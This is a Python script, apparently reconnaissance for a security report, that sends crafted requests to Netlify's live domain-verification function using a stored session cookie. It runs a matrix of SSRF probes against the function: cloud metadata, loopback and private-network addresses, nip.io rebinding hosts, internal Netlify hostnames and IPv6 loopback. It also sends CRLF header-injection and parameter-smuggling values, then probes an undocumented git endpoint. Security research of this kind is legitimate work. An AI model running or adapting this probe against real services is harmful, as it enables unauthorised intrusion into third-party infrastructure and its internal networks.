# -*- coding: utf-8 -*-
"""verify?domain= 接口变异:DNS 验证函数的输入面矩阵
verify 调用形态: GET /.netlify/functions/verify?domain=X -> {results:[{domain,result,error,cdnTier}]}
疑点: 若做 HTTP 出站(检查域名可达/CDN tier),私有网段会超时 -> 类似 sdk-version 但可能有回显
"""
import http.client, ssl, gzip, brotli, json, sys, time, urllib.parse
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A

ctx = ssl.create_default_context()

def req(path, cookie=COOKIE_A, method='GET', body=None, timeout=30):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip', 'Accept': 'application/json'}
    if cookie: h['Cookie'] = cookie
    if body is not None:
        h['Content-Type'] = 'application/json'
        body = body if isinstance(body, bytes) else body.encode()
    t0 = time.time()
    conn.request(method, path, body=body, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    dt = time.time() - t0
    st = r.status
    conn.close()
    return st, raw.decode('utf-8', 'ignore').replace('\n', ' ')[:300], dt

def show(label, path, ck=COOKIE_A, method='GET', body=None):
    st, raw, dt = req(path, ck, method=method, body=body)
    print('%-28s %s %6.1fs | %s' % (label, st, dt, raw))
    return st, raw, dt

print('==== 1. verify 基线:匿名 vs cookie ====')
show('ANON baseline', '/.netlify/functions/verify?domain=example.com', None)
show('A baseline', '/.netlify/functions/verify?domain=example.com')

print()
print('==== 2. verify domain 变异矩阵 ====')
variants = [
    ('empty',            ''),
    ('no-such-tld',      'no-such-domain-xyz12345.zzz'),
    ('bare ip 169.254',  '169.254.100.5'),
    ('bare ip 127.0.0.1','127.0.0.1'),
    ('bare ip 10.96',    '10.96.0.1'),
    ('nip.io 127',       '127.0.0.1.nip.io'),
    ('nip.io rfc1918',   '10.255.255.1.nip.io'),
    ('internal tld',     'foo.netlify.internal'),
    ('internal sub',     'api.netlify.internal'),
    ('localhost',        'localhost'),
    ('localhost.locald','localhost.localdomain'),
    ('wildcard',         '*.example.com'),
    ('port suffix',      'example.com:443'),
    ('path suffix',      'example.com/foo'),
    ('space',            'a b.com'),
    ('crlf',             'example.com%0d%0aX-I:1'),
    ('multi a&b',        'a.example.com&b=2'),
    ('semi',             'example.com;x'),
    ('very long',        'x' * 250 + '.com'),
    ('underscore',       '_dmarc.example.com'),
    ('ip6',              '::1'),
]
for label, dom in variants:
    p = '/.netlify/functions/verify?domain=' + urllib.parse.quote(dom, safe='')
    show('dom:' + label, p)

print()
print('==== 3. domain 参数结构变异(JSON body / 多参数) ====')
show('GET ?domain=a&domain=b', '/.netlify/functions/verify?domain=aaa.com&domain=bbb.com')
show('POST body {"domain":...}', '/.netlify/functions/verify',
     method='POST', body=json.dumps({'domain': 'example.com'}))
show('POST body {"domains":[]}', '/.netlify/functions/verify',
     method='POST', body=json.dumps({'domains': ['example.com']}))
show('no param', '/.netlify/functions/verify')
show('other param', '/.netlify/functions/verify?site=example.com')

print()
print('==== 4. git 接口形态探测 ====')
show('git bare GET', '/.netlify/functions/git')
show('git /repos GET', '/.netlify/functions/git/repos')
show('git /user GET', '/.netlify/functions/git/user')
show('git POST {}', '/.netlify/functions/git', method='POST', body=b'{}')
show('git ?path=', '/.netlify/functions/git?path=repos')
show('git search', '/.netlify/functions/git/search/repositories?q=netlify')
print('done')
